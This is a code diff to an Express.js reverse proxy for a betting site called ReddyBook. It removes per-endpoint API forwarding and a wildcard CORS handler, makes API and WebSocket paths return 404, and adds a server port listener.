-app.all('/api/client/casino_vivo', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/casino_mac444', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/rules', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/menu', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/market-analysis', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/multi-market', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/cash-out-new', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/fast-cash-out', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/sports-book', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/sports-book-new/:id', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/bonus-list', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/bonus-redeem', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/bonus_rules', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/refer-and-earn', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/recent-tables', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/event-type-id/list', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/users/force_change_username', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/logout', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/socket_auth', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/ws/getMarketData', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/ws/getMarketDataNew', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/ws/getScoreData', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/races', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/client/races', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/api/guest/casino_i', async (req, res) => { await transparentApiProxy(req, res); });
-
-app.all('/api/*', async (req, res) => { await transparentApiProxy(req, res); });
-app.all('/ws/*', async (req, res) => { await transparentApiProxy(req, res); });
-
-app.options('*', (req, res) => {
-  res.set({
-    'Access-Control-Allow-Origin': '*',
-    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
-    'Access-Control-Allow-Headers': '*',
-    'Access-Control-Max-Age': '86400'
-  });
-  res.sendStatus(204);
-});
-
 app.get('*', async (req, res) => {
-  const path = req.originalUrl || req.url;
+  const path = req.path;
   if (path.startsWith('/api/') || path.startsWith('/ws/')) {
-    return await transparentApiProxy(req, res);
+    return res.status(404).json({ error: 'API calls should go directly to the API server' });
   }
   await websiteProxy(req, res);
 });
 
 app.all('*', async (req, res) => {
-  const path = req.originalUrl || req.url;
+  const path = req.path;
   if (path.startsWith('/api/') || path.startsWith('/ws/')) {
-    return await transparentApiProxy(req, res);
+    return res.status(404).json({ error: 'API calls should go directly to the API server' });
   }
   await websiteProxy(req, res);
 });
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`ReddyBook proxy running on port ${PORT}`));
 
 module.exports = app;
